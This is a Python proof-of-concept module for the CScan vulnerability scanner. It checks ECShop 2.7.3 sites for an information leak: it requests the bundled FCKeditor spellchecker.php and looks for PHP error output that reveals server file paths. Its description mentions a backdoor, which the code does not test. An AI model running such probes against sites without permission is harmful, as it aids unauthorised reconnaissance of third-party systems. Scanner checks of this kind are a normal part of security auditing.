# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Ecshop_0001'  # 平台漏洞编号，留空
    name = 'Ecshop /spellchecker.php 信息泄漏漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-03-12'  # 漏洞公布时间
    desc = '''
        ECShop是国内一款流行的网店管理系统软件，其2.7.3版本某个补丁存在后门文件，攻击者利用后门可以控制网站。
    '''  # 漏洞描述
    ref = 'https://www.cnblogs.com/LittleHann/p/4523793.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Ecshop'  # 漏洞应用名称
    product_version = '2.7.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7a38cacc-6dd5-405d-967d-05b2b06e8145'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/includes/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php'
            verify_url = self.target + payload
            req = requests.get(verify_url)
            if req.status_code == 200:
                m = re.search(
                    'in <b>([^<]+)</b> on line <b>(\d+)</b>', req.text)
                if m:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
